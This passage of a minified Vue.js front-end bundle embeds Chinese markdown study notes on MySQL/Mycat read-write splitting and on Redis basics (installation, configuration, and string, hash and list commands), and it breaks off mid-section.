--\x3e\r\n  \t\t<readHost host="hostS1" url="192.168.203.135:3306" user="root" password="itheima" />\r\n  \t\t</writeHost>\r\n  \t</dataHost>\r\n  \t\r\n  </mycat:schema>\r\n  ```\r\n\r\n  - 测试\r\n\r\n    - sqlyog连接mycat\r\n\r\n    ```mysql\r\n    -- 创建dog表\r\n    CREATE TABLE dog(\r\n    \tid INT PRIMARY KEY AUTO_INCREMENT,\r\n    \tNAME VARCHAR(10)\r\n    );\r\n    -- 添加数据\r\n    INSERT INTO dog(id,NAME) VALUES (NEXT VALUE FOR MYCATSEQ_GLOBAL,\'哈士奇\');\r\n    -- 查询dog表\r\n    SELECT * FROM dog;\r\n    \r\n    \r\n    -- 创建cat表\r\n    CREATE TABLE cat(\r\n    \tid INT PRIMARY KEY AUTO_INCREMENT,\r\n    \tNAME VARCHAR(10)\r\n    );\r\n    -- 添加数据\r\n    INSERT INTO cat(id,NAME) VALUES (NEXT VALUE FOR MYCATSEQ_GLOBAL,\'波斯猫\');\r\n    -- 查询cat表\r\n    SELECT * FROM cat;\r\n    \r\n    \r\n    \r\n    -- 创建apple表\r\n    CREATE TABLE apple(\r\n    \tid INT PRIMARY KEY AUTO_INCREMENT,\r\n    \tNAME VARCHAR(10)\r\n    );\r\n    -- 添加数据\r\n    INSERT INTO apple(id,NAME) VALUES (NEXT VALUE FOR MYCATSEQ_GLOBAL,\'红富士\');\r\n    -- 查询apple表\r\n    SELECT * FROM apple;\r\n    \r\n    \r\n    -- 创建banana表\r\n    CREATE TABLE banana(\r\n    \tid INT PRIMARY KEY AUTO_INCREMENT,\r\n    \tNAME VARCHAR(10)\r\n    );\r\n    -- 添加数据\r\n    INSERT INTO banana(id,NAME) VALUES (NEXT VALUE FOR MYCATSEQ_GLOBAL,\'香蕉\');\r\n    -- 查询banana表\r\n    SELECT * FROM banana;\r\n    ```\r\n\r\n    - sqlyog连接主服务器\r\n\r\n    ```mysql\r\n    -- 查询dog表\r\n    SELECT * FROM dog;\r\n    -- 查询cat表\r\n    SELECT * FROM cat;\r\n    \r\n    \r\n    -- 查询apple表\r\n    SELECT * FROM apple;\r\n    -- 查询banana表\r\n    SELECT * FROM banana;\r\n    ```\r\n\r\n    - sqlyog连接从服务器\r\n\r\n    ```mysql\r\n    -- 查询dog表\r\n    SELECT * FROM dog;\r\n    -- 查询cat表\r\n    SELECT * FROM cat;\r\n    \r\n    \r\n    -- 查询apple表\r\n    SELECT * FROM apple;\r\n    -- 查询banana表\r\n    SELECT * FROM banana;\r\n    ```\r\n',pn={data:function(){return{MainComponent:cn}}},un=pn,mn=Object(u["a"])(un,on,ln,!1,null,"61501579",null),dn=mn.exports,gn=t("1b62"),bn={mixins:[gn["a"]],components:{m1:d,m2:y,m3:T,m5:L,m6:q,m7:W,m8:Y,m9:sn,m10:dn},data:function(){return{tab:"m1",tab_level:2,tabs:[{label:"基本",value:"m1"},{label:"常见错误",value:"m2"},{label:"常规语句",value:"m3"},{label:"LINUX 安装 5.7 mysql",value:"m5"},{label:"MySQL数据类型",value:"m7"},{label:"MySQL基础",value:"m6"},{label:"MySQL进阶",value:"m8"},{label:"MySQL高级1",value:"m9"},{label:"MySQL高级2",value:"m10"}]}}},vn=bn,hn=Object(u["a"])(vn,i,s,!1,null,"33669a8e",null),Sn=hn.exports,yn=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t(""+n.tab,{tag:"component"})],1)},fn=[],_n=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},xn=[],wn='\x3c!--\n * @Date           : 2021-04-19 00:11:26\n * @FilePath       : /jinnian-space/src/pages/sql/module/redis/md/第一章 Redis基础.md\n * @Description    : \n--\x3e\n\n\n# 第一章 Redis基础\n\n**课程计划**\n\n| 1. Redis 入 门         | **（了解）** | **（操作）** |              |\n| ---------------------- | ------------ | ------------ | ------------ |\n| 2. 数据类型            | **（重点）** | **（操作）** | **（理解）** |\n| 3. 常用指令            |              | **（操作）** |              |\n| 4. Jedis               | **（重点）** | **（操作）** |              |\n| 5. 持 久 化            | **（重点）** |              | **（理解）** |\n| 6. 数据删除与淘汰策略  |              |              | **（理解）** |\n| 7. 主从复制            | **（重点）** | **（操作）** | **（理解）** |\n| 8. 哨 兵               | **（重点）** | **（操作）** | **（理解）** |\n| 9. Cluster集群方案     | **（重点）** | **（操作）** | **（理解）** |\n| 10. 企业级缓存解决方案 | **（重点）** |              | **（理解）** |\n| 11. 性能指标监控       | **（了解）** |              |              |\n\n## 学习目标：\n\n目标1：能够说出NoSQL的概念，redis的应用场景，能够完成redis的下载安装与启动以及一些常用的配置\n\n目标2：能够说出redis常用的5种数据类型，对应这些数据类型的基本操作，应用场景及对应的解决方案\n\n目标3：能够说出redis中常用的一些基本指令\n\n目标4：能够使用jedis完成客户端应用程序的开发\n\n目标5：能够说出redis数据持久化的两种方式，各自相关的操作配置及指令，以及两种方式的优缺点比较\n\n## 1. Redis 简介\n\n在这个部分，我们将学习以下3个部分的内容，分别是：\n\n◆ Redis 简介（NoSQL概念、Redis概念）\n\n◆ Redis 的下载与安装\n\n◆ Redis 的基本操作\n\n### 1.1 NoSQL概念\n\n#### 1.1.1 问题现象\n\n在讲解NoSQL的概念之前呢，我们先来看一个现象：\n\n（1）问题现象\n\n每年到了过年期间，大家都会自觉自发的组织一场活动，叫做春运！以前我们买票都是到火车站排队，后来呢有了12306，有了他以后就更方便了，我们可以在网上买票，但是带来的问题，大家也很清楚，春节期间买票进不去，进去了刷不着票。什么原因呢，人太多了！\n  ![112555588888](./img/sql/redis/第一章Redis基础/java/redis/第一章Redis基础/12306-淘宝.png)\n\n除了这种做铁路的，它系统做的不专业以外，还有马爸爸做的淘宝，它面临一样的问题。淘宝也崩，也是用户量太大！作为我们整个电商界的东哥来说，他第一次做图书促销的时候，也遇到了服务器崩掉的这样一个现象，原因同样是因为用户量太大！\n  ![](./img/sql/redis/第一章Redis基础/京东翻车案.png)\n\n（2）现象特征\n\n再来看这几个现象，有两个非常相似的特征：\n\n第一，用户比较多，海量用户\n\n第二，高并发\n\n这两个现象出现以后，对应的就会造成我们的服务器瘫痪。核心本质是什么呢？其实并不是我们的应用服务器，而是我们的关系型数据库。关系型数据库才是最终的罪魁祸首！\n\n（3）造成原因\n\n什么样的原因导致的整个系统崩掉的呢：\n\n1.性能瓶颈：磁盘IO性能低下\n\n关系型数据库菜存取数据的时候和读取数据的时候他要走磁盘IO。磁盘这个性能本身是比较低的。\n\n2.扩展瓶颈：数据关系复杂，扩展性差，不便于大规模集群\n\n我们说关系型数据库，它里面表与表之间的关系非常复杂，不知道大家能不能想象一点，就是一张表，通过它的外键关联了七八张表，这七八张表又通过她的外件，每张又关联了四五张表。你想想，查询一下，你要想拿到数据，你就要从A到B、B到C、C到D的一直这么关联下去，最终非常影响查询的效率。同时，你想扩展下，也很难!\n\n（4）解决思路\n\n面对这样的现象，我们要想解决怎么版呢。两方面：\n\n一，降低磁盘IO次数，越低越好。\n\n二，去除数据间关系，越简单越好。\n\n降低磁盘IO次数，越低越好，怎么搞？我不用你磁盘不就行了吗？于是，内存存储的思想就提出来了，我数据不放到你磁盘里边，放内存里，这样是不是效率就高了。\n\n第二，你的数据关系很复杂，那怎么办呢？干脆简单点，我断开你的关系，我不存关系了，我只存数据，这样不就没这事了吗？\n\n把这两个特征一合并一起，就出来了一个新的概念：NoSQL\n\n#### 1.1.2 NoSQL的概念\n\n（1）概念\n\nNoSQL：即 Not-Only SQL（ 泛指非关系型的数据库），作为关系型数据库的补充。 作用：应对基于海量用户和海量数据前提下的数据处理问题。\n\n他说这句话说的非常客气，什么意思呢？就是我们数据存储要用SQL，但是呢可以不仅仅用SQL，还可以用别的东西，那别的东西叫什么呢？于是他定义了一句话叫做NoSQL。这个意思就是说我们存储数据，可以不光使用SQL，我们还可以使用非SQL的这种存储方案，这就是所谓的NoSQL。\n\n（2）特征\n\n可扩容，可伸缩。SQL数据关系过于复杂，你扩容一下难度很高，那我们Nosql 这种的，不存关系，所以它的扩容就简单一些。\n\n大数据量下高性能。包数据非常多的时候，它的性能高，因为你不走磁盘IO，你走的是内存，性能肯定要比磁盘IO的性能快一些。\n\n灵活的数据模型、高可用。他设计了自己的一些数据存储格式，这样能保证效率上来说是比较高的，最后一个高可用，我们等到集群内部分再去它！\n\n（3）常见 Nosql 数据库\n\n目前市面上常见的Nosql产品：Redis、memcache、HBase、MongoDB\n\n（4）应用场景-电商为例\n\n我们以电商为例，来看一看他在这里边起到的作用。\n\n第一类，在电商中我们的基础数据一定要存储起来，比如说商品名称，价格，生产厂商，这些都属于基础数据，这些数据放在MySQL数据库。\n\n第二类，我们商品的附加信息，比如说，你买了一个商品评价了一下，这个评价它不属于商品本身。就像你买一个苹果，“这个苹果很好吃”就是评论，但是你能说很好吃是这个商品的属性嘛？不能这么说，那只是一个人对他的评论而已。这一类数据呢，我们放在另外一个地方，我们放到MongoDB。它也可以用来加快我们的访问，他属于NoSQL的一种。\n\n第三，图片内的信息。注意这种信息相对来说比较固定，他有专用的存储区，我们一般用文件系统来存储。至于是不是分布式，要看你的系统的一个整个   瓶颈   了？如果说你发现你需要做分布式，那就做，不需要的话，一台主机就搞定了。\n\n第四，搜索关键字。为了加快搜索，我们会用到一些技术，有些人可能了解过，像分ES、Lucene、solr都属于搜索技术。那说的这么热闹，我们的电商解决方案中还没出现我们的redis啊！注意第五类信息。\n\n第五，热点信息。访问频度比较高的信息，这种东西的第二特征就是它具有波段性。换句话说他不是稳定的，它具有一个时效性的。那么这类信息放哪儿了，放到我们的redis这个解决方案中来进行存储。\n\n具体的我们从我们的整个数据存储结构的设计上来看一下。\n\n![](./img/sql/redis/第一章Redis基础/电商场景解决方案.png)\n\n我们的基础数据都存MySQL,在它的基础之上，我们把它连在一块儿，同时对外提供服务。向上走，有一些信息加载完以后,要放到我们的MongoDB中。还有一类信息，我们放到我们专用的文件系统中（比如图片），就放到我们的这个搜索专用的，如Lucene、solr及集群里边，或者用ES的这种技术里边。那么剩下来的热点信息，放到我们的redis里面。\n\n### 1.2 Redis概念\n\n#### 1.2.1 redis概念\n\n概念：Redis (REmote DIctionary Server) 是用 C 语言开发的一个开源的高性能键值对（key-value）数据库。\n\n特征：\n\n（1）数据间没有必然的关联关系；\n\n（2）内部采用单线程机制进行工作；\n\n（3）高性能。官方提供测试数据，50个并发执行100000 个请求,读的速度是110000 次/s,写的速度是81000次/s。\n\n（4）多数据类型支持\n\n \n\n|     类型       |                     |\n| -------------- | -------------------- | \n| 字符串类型   |    string            |\n| 列表类型     |     list             |\n| 散列类型     |     hash             |\n| 集合类型       |      set             |\n| 有序集合类型   |    zset/sorted_set   |\n\n（5）支持持久化，可以进行数据灾难恢复\n\n#### 1.2.2 redis的应用场景\n\n（1）为热点数据加速查询（主要场景）。如热点商品、热点新闻、热点资讯、推广类等高访问量信息等。\n\n（2）即时信息查询。如各位排行榜、各类网站访问统计、公交到站信息、在线人数信息（聊天室、网站）、设备信号等。\n\n（3）时效性信息控制。如验证码控制、投票控制等。\n\n（4）分布式数据共享。如分布式集群架构中的 session 分离\n\n（5）消息队列.\n\n### 1.3 Redis 的下载与安装\n\n后期所有资料分4中不同色块显示，详情如下：\n\n![](./img/sql/redis/第一章Redis基础/约定格式.png)\n\n#### 1.3.1 Redis 的下载与安装\n\n本课程所示，均基于Center OS7安装Redis。\n\n（1)下载Redis\n\n下载安装包：\n\n```bash\nwget http://download.redis.io/releases/redis-5.0.0.tar.gz\n```\n\n解压安装包：\n\n```bash\ntar –xvf redis-5.0.0.tar.gz\n```\n\n编译（在解压的目录中执行）：\n\n```bash\nmake\n```\n\n安装（在解压的目录中执行）：\n\n```bash\nmake install\n```\n\n（2）安装 Redis\n\nredis-server，服务器启动命令 客户端启动命令\n\nredis-cli，redis核心配置文件\n\nredis.conf，RDB文件检查工具（快照持久化文件）\n\nredis-check-dump，AOF文件修复工具\n\nredis-check-aof\n\n### 1.4 Redis服务器启动\n\n#### 1.4.1 Redis服务器启动\n\n启动服务器——参数启动\n\n```bash\nredis-server [--port port]\n```\n\n范例\n\n```bash\nredis-server --port 6379\n```\n\n启动服务器——配置文件启动\n\n```bash\nredis-server config_file_name\n```\n\n范例\n\n```bash\nredis-server redis.conf\n```\n\n#### 1.4.2 Redis客户端启动\n\n启动客户端\n\n```bash\nredis-cli [-h host] [-p port]\n```\n\n范 例\n\n```bash\nredis-cli –h 61.129.65.248 –p 6384\n```\n\n注意：服务器启动指定端口使用的是--port，客户端启动指定端口使用的是-p。-的数量不同。\n\n#### 1.4.3 Redis基础环境设置约定\n\n创建配置文件存储目录\n\n```bash\nmkdir conf\n```\n\n创建服务器文件存储目录（包含日志、数据、临时配置文件等）\n\n```bash\nmkdir data\n```\n\n创建快速访问链接\n\n```bash\nln -s redis-5.0.0 redis\n```\n\n### 1.5 配置文件启动与常用配置\n\n#### 1.5.1 服务器端设定\n\n设置服务器以守护进程的方式运行，开启后服务器控制台中将打印服务器运行信息（同日志内容相同）\n\n```bash\ndaemonize yes|no\n```\n\n绑定主机地址\n\n```bash\nbind ip\n```\n\n设置服务器端口\n\n```bash\nport port\n```\n\n设置服务器文件保存地址\n\n```bash\ndir path\n```\n\n#### 1.5.2  客户端配置\n\n 服务器允许客户端连接最大数量，默认0，表示无限制。当客户端连接到达上限后，Redis会拒绝新的连接\n\n```bash\nmaxclients count\n```\n\n客户端闲置等待最大时长，达到最大值后关闭对应连接。如需关闭该功能，设置为 0\n\n```bash\ntimeout seconds\n```\n\n#### 1.5.3  日志配置\n\n设置服务器以指定日志记录级别\n\n```bash\nloglevel debug|verbose|notice|warning\n```\n\n日志记录文件名\n\n```bash\nlogfile filename\n```\n\n注意：日志级别开发期设置为verbose即可，生产环境中配置为notice，简化日志输出量，降低写日志IO的频度。\n\n### 1.6 Redis基本操作\n\n#### 1.6.1  命令行模式工具使用思考\n\n功能性命令\n\n帮助信息查阅\n\n退出指令\n\n清除屏幕信息\n\n#### 1.6.2  信息读写\n\n设置 key，value 数据\n\n```bash\nset key value\n```\n\n范例\n\n```bash\nset name itheima\n```\n\n根据 key 查询对应的 value，如果不存在，返回空（nil）\n\n```bash\nget key\n```\n\n范例\n\n```bash\nget name\n```\n\n#### 1.6.3  帮助信息\n\n获取命令帮助文档\n\n```bash\nhelp [command]\n```\n\n范例\n\n```bash\nhelp set\n```\n\n获取组中所有命令信息名称\n\n```bash\nhelp [@group-name]\n```\n\n范例\n\n```bash\nhelp @string\n```\n\n1.6.4  退出命令行客户端模式\n\n退出客户端\n\n````bash\nquit\nexit\n````\n\n快捷键\n\n```bash\nCtrl+C\n```\n\n#### 1.6.4  redis入门总结\n\n到这里，Redis 入门的相关知识，我们就全部学习完了，再来回顾一下，这个部分我们主要讲解了哪些内容呢？\n\n首先，我们对Redis进行了一个简单介绍，包括NoSQL的概念、Redis的概念等。\n\n然后，我们介绍了Redis 的下载与安装。包括下载与安装、服务器与客户端启动、以及相关配置文件（3类）。\n\n最后，我们介绍了Redis 的基本操作。包括数据读写、退出与帮助信息获取。\n\n## 2. 数据类型\n\n在这个部分，我们将学习一共要学习三大块内容，首先需要了解一下数据类型，接下来将针对着我们要学习的数据类型进行逐一的讲解，如string、hash、list、set等，最后我们通过一个案例来总结前面的数据类型的使用场景。\n\n### 2.1  数据存储类型介绍\n\n#### 2.1.1  业务数据的特殊性\n\n在讲解数据类型之前，我们得先思考一个问题，数据类型既然是用来描述数据的存储格式的，如果你不知道哪些数据未来会进入到我们来的redis中，那么对应的数据类型的选择，你就会出现问题，我们一块来看一下：\n\n（1）原始业务功能设计\n\n秒杀。他这个里边数据变化速度特别的快，访问量也特别的高，用户大量涌入以后都会针对着一部分数据进行操作，这一类要记住。\n\n618活动。对于我们京东的618活动、以及天猫的双11活动，相信大家不用说都知道这些数据一定要进去，因为他们的访问频度实在太高了。\n\n排队购票。我们12306的票务信息。这些信息在原始设计的时候，他们就注定了要进redis。\n\n（2）运营平台监控到的突发高频访问数据\n\n此类平台临时监控到的这些数据，比如说现在出来的一个八卦的信息，这个新闻一旦出现以后呢，顺速的被围观了，那么这个时候，这个数据就会变得访量特别高，那么这类信息也要进入进去。\n\n（3）高频、复杂的统计数据\n\n在线人数。比如说直播现在很火，直播里边有很多数据，例如在线人数。进一个人出一个人，这个数据就要跳动，那么这个访问速度非常的快，而且访量很高，并且它里边有一个复杂的数据统计，在这里这种信息也要进入到我们的redis中。\n\n投票排行榜。投票投票类的信息他的变化速度也比较快，为了追求一个更快的一个即时投票的名次变化，这种数据最好也放到redis中。\n\n#### 2.1.2  Redis 数据类型(5种常用)\n\n基于以上数据特征我们进行分析，最终得出来我们的Redis中要设计5种 数据类型：\n\nstring、hash、list、set、sorted_set/zset（应用性较低）\n\n### 2.2  string数据类型\n\n在学习第一个数据类型之前，先给大家介绍一下，在随后这部分内容的学习过程中，我们每一种数据类型都分成三块来讲：首先是讲下它的基本操作，接下来讲一些它的扩展操作，最后我们会去做一个小的案例分析。\n\n#### 2.2.1Redis 数据存储格式\n\n在学习string这个数据形式之前，我们先要明白string到底是修饰什么的。我们知道redis 自身是一个 Map，其中所有的数据都是采用 key : value 的形式存储。\n\n对于这种结构来说，我们用来存储数据一定是一个值前面对应一个名称。我们通过名称来访问后面的值。按照这种形势，我们可以对出来我们的存储格式。前面这一部分我们称为key。后面的一部分称为value，而我们的数据类型，他一定是修饰value的。\n\n![](./img/sql/redis/第一章Redis基础/redis存储空间.png)\n\n数据类型指的是存储的数据的类型，也就是 value 部分的类型，key 部分永远都是字符串。\n\n#### 2.2.2  string 类型\n\n（1）存储的数据：单个数据，最简单的数据存储类型，也是最常用的数据存储类型。\n\nstring，他就是存一个字符串儿，注意是value那一部分是一个字符串，它是redis中最基本、最简单的存储数据的格式。\n\n（2）存储数据的格式：一个存储空间保存一个数据\n\n每一个空间中只能保存一个字符串信息，这个信息里边如果是存的纯数字，他也能当数字使用，我们来看一下，这是我们的数据的存储空间。\n\n（3）存储内容：通常使用字符串，如果字符串以整数的形式展示，可以作为数字操作使用.\n\n![](./img/sql/redis/第一章Redis基础/redis存储空间2.png)\n\n一个key对一个value，而这个itheima就是我们所说的string类型，当然它也可以是一个纯数字的格式。\n\n#### 2.2.3  string 类型数据的基本操作\n\n（1）基础指令\n\n添加/修改数据添加/修改数据\n\n```\nset key value\n```\n\n获取数据\n\n```\nget key\n```\n\n删除数据\n\n```\ndel key\n```\n\n判定性添加数据\n\n```\nsetnx key value\n```\n\n添加/修改多个数据\n\n```\nmset key1 value1 key2 value2 …\n```\n\n获取多个数据\n\n```\nmget key1 key2 …\n```\n\n获取数据字符个数（字符串长度）\n\n```\nstrlen key\n```\n\n追加信息到原始信息后部（如果原始信息存在就追加，否则新建）\n\n```\nappend key value\n```\n\n（2）单数据操作与多数据操作的选择之惑\n\n即set 与mset的关系。这对于这两个操作来说，没有什么你应该选哪个，而是他们自己的特征是什么，你要根据这个特征去比对你的业务，看看究竟适用于哪个。\n\n![](./img/sql/redis/第一章Redis基础/set.png)\n\n假如说这是我们现在的服务器，他要向redis要数据的话，它会发出一条指令。那么当这条指令发过来的时候，比如说是这个set指令过来，那么它会把这个结果返回给你，这个时候我们要思考这里边一共经过了多长时间。\n\n首先，发送set指令要时间，这是网络的一个时间，接下来redis要去运行这个指令要消耗时间，最终把这个结果返回给你又有一个时间，这个时间又是一个网络的时间，那我们可以理解为：一个指令发送的过程中需要消耗这样的时间.\n\n但是如果说现在不是一条指令了，你要发3个set的话，还要多长时间呢？对应的发送时间要乘3了，因为这是三个单条指令,而运行的操作时间呢，它也要乘3了，但最终返回的也要发3次，所以这边也要乘3。\n\n于是我们可以得到一个结论：单指令发3条它需要的时间，假定他们两个一样，是6个网络时间加3个处理时间，如果我们把它合成一个mset呢，我们想一想。\n\n假如说用多指令发3个指令的话，其实只需要发一次就行了。这样我们可以得到一个结论，多指令发3个指令的话，其实它是两个网络时间加上3个redis的操作时间，为什么这写一个小加号呢，就是因为毕竟发的信息量变大了，所以网络时间有可能会变长。\n\n那么通过这张图，你就可以得到一个结论，我们单指令和多指令他们的差别就在于你发送的次数是多还是少。当你影响的数据比较少的时候，你可以用单指令，也可以用多指令。但是一旦这个量大了，你就要选择多指令了，他的效率会高一些。\n\n### 2.3  string 类型数据的扩展操作\n\n#### 2.3.1  string 类型数据的扩展操作\n\n下面我们来看一string的扩展操作，分成两大块：一块是对数字进行操作的，第二块是对我们的key的时间进行操作的。\n\n设置数值数据增加指定范围的值\n\n```bash\nincr key\nincrby key increment\nincrbyfloat key increment\n```\n\n设置数值数据减少指定范围的值\n\n```bash\ndecr key\ndecrby key increment\n```\n\n设置数据具有指定的生命周期\n\n```bash\nsetex key seconds value\npsetex key milliseconds value\n```\n\n#### 2.3.2  string 类型数据操作的注意事项\n\n(1)数据操作不成功的反馈与数据正常操作之间的差异\n\n表示运行结果是否成功\n\n(integer) 0  → false                 失败\n\n(integer) 1  → true                  成功\n\n表示运行结果值\n\n(integer) 3  → 3                        3个\n\n(integer) 1  → 1                         1个\n\n(2)数据未获取到时，对应的数据为（nil），等同于null\n\n(3)数据最大存储量：512MB\n\n(4)string在redis内部存储默认就是一个字符串，当遇到增减类操作incr，decr时会转成数值型进行计算\n\n(5)按数值进行操作的数据，如果原始数据不能转成数值，或超越了redis 数值上限范围，将报错\n9223372036854775807（java中Long型数据最大值，Long.MAX_VALUE）\n\n(6)redis所有的操作都是原子性的，采用单线程处理所有业务，命令是一个一个执行的，因此无需考虑并发带来的数据影响.\n\n### 2.4string应用场景与key命名约定\n\n#### 2.4.1  应用场景\n\n它的应用场景在于：主页高频访问信息显示控制，例如新浪微博大V主页显示粉丝数与微博数量。\n\n![](./img/sql/redis/第一章Redis基础/string应用场景.png)\n\n我们来思考一下：这些信息是不是你进入大V的页面儿以后就要读取这写信息的啊，那这种信息一定要存储到我们的redis中，因为他的访问量太高了！那这种数据应该怎么存呢？我们来一块儿看一下方案！\n\n#### 2.4.2  解决方案\n\n（1）在redis中为大V用户设定用户信息，以用户主键和属性值作为key，后台设定定时刷新策略即可。\n\n```markdown\neg:\tuser:id:3506728370:fans\t\t→\t12210947\neg:\tuser:id:3506728370:blogs\t→\t6164\neg:\tuser:id:3506728370:focuses\t→\t83\n```\n\n（2）也可以使用json格式保存数据\n\n```markdown\neg:\tuser:id:3506728370    →\t{“fans”：12210947，“blogs”：6164，“ focuses ”：83 }\n```\n\n（3） key 的设置约定\n\n数据库中的热点数据key命名惯例\n\n|       | **表名** | **主键名** | 主键值    | **字段名** |\n| ----- | -------- | ---------- | --------- | ---------- |\n| eg1： | order    | id         | 29437595  | name       |\n| eg2： | equip    | id         | 390472345 | type       |\n| eg3： | news     | id         | 202004150 | title      |\n\n### 2.5  hash的基本操作\n\n下面我们来学习第二个数据类型hash。\n\n#### 2.5.1  数据存储的困惑\n\n对象类数据的存储如果具有较频繁的更新需求操作会显得笨重！\n\n在正式学习之前，我们先来看一个关于数据存储的困惑：\n\n![](./img/sql/redis/第一章Redis基础/hash存储.png)\n\n比如说前面我们用以上形式存了数据，如果我们用单条去存的话，它存的条数会很多。但如果我们用json格式，它存一条数据就够了。问题来了，假如说现在粉丝数量发生变化了，你要把整个值都改了。但是用单条存的话就不存在这个问题，你只需要改其中一个就行了。这个时候我们就想，有没有一种新的存储结构，能帮我们解决这个问题呢。\n\n我们一块儿来分析一下：\n\n![](./img/sql/redis/第一章Redis基础/数据.png)\n\n如上图所示：单条的话是对应的数据在后面放着。仔细观察：我们看左边是不是长得都一模一样啊，都是对应的表名、ID等的一系列的东西。我们可以将右边红框中的这个区域给他封起来。\n\n那如果要是这样的形式的话，如下图，我们把它一合并，并把右边的东西给他变成这个格式，这不就行了吗？\n\n![](./img/sql/redis/第一章Redis基础/hash数据.png)\n\n这个图其实大家并不陌生，第一，你前面学过一个东西叫hashmap不就这格式吗？第二，redis自身不也是这格式吗？那是什么意思呢？注意，这就是我们要讲的第二种格式，hash。\n\n![](./img/sql/redis/第一章Redis基础/hash结构.png)\n\n在右边对应的值，我们就存具体的值，那左边儿这就是我们的key。问题来了，那中间的这一块叫什么呢？这个东西我们给他起个名儿，叫做field字段。那么右边儿整体这块儿空间我们就称为hash，也就是说hash是存了一个key value的存储空间。\n\n#### 2.5.2  hash 类型\n\n新的存储需求：对一系列存储的数据进行编组，方便管理，典型应用存储对象信息\n\n需要的存储结构：一个存储空间保存多个键值对数据\n\nhash类型：底层使用哈希表结构实现数据存储\n\n![](./img/sql/redis/第一章Redis基础/hash结构图.png)\n\n如上图所示，这种结构叫做hash，左边一个key，对右边一个存储空间。这里要明确一点，右边这块儿存储空间叫hash，也就是说hash是指的一个数据类型，他指的不是一个数据，是这里边的一堆数据，那么它底层呢，是用hash表的结构来实现的。\n\n值得注意的是：\n\n如果field数量较少，存储结构优化为类数组结构\n\n如果field数量较多，存储结构使用HashMap结构\n\n#### 2.5.3  hash 类型数据的基本操作\n\n添加/修改数据\n\n```bash\nhset key field value\n```\n\n获取数据\n\n```bash\nhget key field\nhgetall key\n```\n\n删除数据\n\n```bash\nhdel key field1 [field2]\n```\n\n设置field的值，如果该field存在则不做任何操作\n\n```bash\nhsetnx key field value\n```\n\n添加/修改多个数据\n\n```bash\nhmset key field1 value1 field2 value2 …\n```\n\n获取多个数据\n\n```bash\nhmget key field1 field2 …\n```\n\n获取哈希表中字段的数量\n\n```bash\nhlen key\n```\n\n获取哈希表中是否存在指定的字段\n\n```bash\nhexists key field\n```\n\n### 2.6  hash的拓展操作\n\n在看完hash的基本操作后，我们再来看他的拓展操作，他的拓展操作相对比较简单：\n\n#### 2.6.1  hash 类型数据扩展操作\n\n获取哈希表中所有的字段名或字段值\n\n```\nhkeys key\nhvals key\n```\n\n设置指定字段的数值数据增加指定范围的值\n\n```\nhincrby key field increment\nhincrbyfloat key field increment\n```\n\n#### 2.6.2  hash类型数据操作的注意事项\n\n(1)hash类型中value只能存储字符串，不允许存储其他数据类型，不存在嵌套现象。如果数据未获取到，对应的值为（nil）。\n\n(2）每个 hash 可以存储 232 - 1 个键值对\nhash类型十分贴近对象的数据存储形式，并且可以灵活添加删除对象属性。但hash设计初衷不是为了存储大量对象而设计 的，切记不可滥用，更不可以将hash作为对象列表使用。\n\n(3)hgetall 操作可以获取全部属性，如果内部field过多，遍历整体数据效率就很会低，有可能成为数据访问瓶颈。\n\n### 2.7  hash应用场景\n\n#### 2.7.1  应用场景\n\n双11活动日，销售手机充值卡的商家对移动、联通、电信的30元、50元、100元商品推出抢购活动，每种商品抢购上限1000  张。\n\n![](./img/sql/redis/第一章Redis基础/hash应用.png)\n\n也就是商家有了，商品有了，数量有了。最终我们的用户买东西就是在改变这个数量。那你说这个结构应该怎么存呢？对应的商家的ID作为key，然后这些充值卡的ID作为field，最后这些数量作为value。而我们所谓的操作是其实就是increa这个操作，只不过你传负值就行了。看一看对应的解决方案：\n\n#### 2.7.2  解决方案\n\n以商家id作为key\n\n将参与抢购的商品id作为field\n\n将参与抢购的商品数量作为对应的value\n\n抢购时使用降值的方式控制产品数量\n\n注意：实际业务中还有超卖等实际问题，这里不做讨论\n\n### 2.8  list基本操作\n\n前面我们存数据的时候呢，单个数据也能存，多个数据也能存，但是这里面有一个问题，我们存多个数据用hash的时候它是没有顺序的。我们平时操作，实际上数据很多情况下都是有顺序的，那有没有一种能够用来存储带有顺序的这种数据模型呢，list就专门来干这事儿。\n\n#### 2.8.1  list 类型\n\n数据存储需求：存储多个数据，并对数据进入存储空间的顺序进行区分\n\n需要的存储结构：一个存储空间保存多个数据，且通过数据可以体现进入顺序\n\nlist类型：保存多个数据，底层使用双向链表存储结构实现\n\n先来通过一张图，回忆一下顺序表、链表、双向链表。\n\n![](./img/sql/redis/第一章Redis基础/list1.png)\n\nlist对应的存储结构是什么呢？里边存的这个东西是个列表，他有一个对应的名称。就是key存一个list的这样结构。对应的基本操作，你其实是可以想到的。\n\n![](./img/sql/redis/第一章Redis基础/list2.png)\n\n来看一下，因为它是双向的，所以他左边右边都能操作，它对应的操作结构两边都能进数据。这就是链表的一个存储结构。往外拿数据的时候怎么拿呢？通常是从一端拿，当然另一端也能拿。如果两端都能拿的话，这就是个双端队列，两边儿都能操作。如果只能从一端进一端出，这个模型咱们前面了解过，叫做栈。\n\n#### 2.8.2 list 类型数据基本操作\n\n最后看一下他的基本操作\n\n添加/修改数据\n\n```bash\nlpush key value1 [value2] ……\nrpush key value1 [value2] ……\n```\n\n获取数据\n\n```bash\nlrange key start stop\nlindex key index\nllen key\n```\n\n获取并移除数据\n\n```bash\nlpop key\nrpop key\n```\n\n### 2.9  list扩展操作\n\n#### 2.9.1  list 类型数据扩展操作\n\n移除指定数据\n\n```\nlrem key count value\n```\n\n规定时间内获取并移除数据\n\n```\nblpop key1 [key2] timeout\nbrpop key1 [key2] timeout\nbrpoplpush source destination timeout\n```\n\n#### 2.9.2  list 类型数据操作注意事项\n\n（1）list中保存的数据都是string类型的，数据总容量是有限的，最多232 - 1 个元素(4294967295)。\n\n（2）list具有索引的概念，但是操作数据时通常以队列的形式进行入队出队操作，或以栈的形式进行入栈出栈操作\n\n（3）获取全部数据操作结束索引设置为-1\n\n（4）list可以对数据进行分页操作，通常第一页的信息来自于list，第2页及更多的信息通过数据库的形式加载\n\n\n\n### 2.10 list 应用场景\n\n#### 2.10.1  